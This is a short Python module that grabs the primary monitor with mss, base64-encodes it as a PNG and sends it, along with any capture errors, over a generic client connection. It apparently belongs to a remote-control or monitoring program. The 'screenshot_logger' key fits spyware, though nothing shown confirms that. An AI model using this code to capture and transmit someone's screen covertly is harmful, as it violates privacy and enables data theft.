import mss
import io
import base64
import traceback
from PIL import Image

def send_screenshot(client, converter):
    try:
        with mss.mss() as sct:
            print("called")
            screenshot = sct.grab(sct.monitors[1])
            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

            buffer = io.BytesIO()
            img.save(buffer, format="PNG")
            screenshot_data = buffer.getvalue()

            screenshot_base64 = base64.b64encode(screenshot_data).decode("utf-8")
            client.send_message(converter.encode({"screenshot": screenshot_base64}))
            print("sent")

    except Exception as e:
        traceback.print_exc()
        client.send_message(converter.encode({"screenshot_logger": str(e)}))
